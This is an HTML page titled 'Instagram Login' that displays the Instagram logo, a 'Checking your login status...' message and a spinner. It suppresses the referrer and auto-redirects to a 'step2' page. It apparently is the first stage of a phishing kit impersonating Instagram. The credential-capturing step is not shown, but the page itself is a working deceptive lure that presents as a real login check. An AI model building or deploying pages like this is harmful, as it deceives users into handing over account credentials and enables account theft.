<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Login</title>
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="refresh" content="1.5; url=step2/index.html">
  <style>
    body {
      background-color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #262626;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .logo {
      width: 120px;
      margin-bottom: 30px;
    }
    .text {
      font-size: 16px;
      color: #8e8e8e;
    }
    .spinner {
      margin-top: 20px;
      width: 24px;
      height: 24px;
      border: 3px solid #dbdbdb;
      border-top: 3px solid #3897f0;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
  <div class="text">Checking your login status...</div>
  <div class="spinner"></div>
</body>
</html>
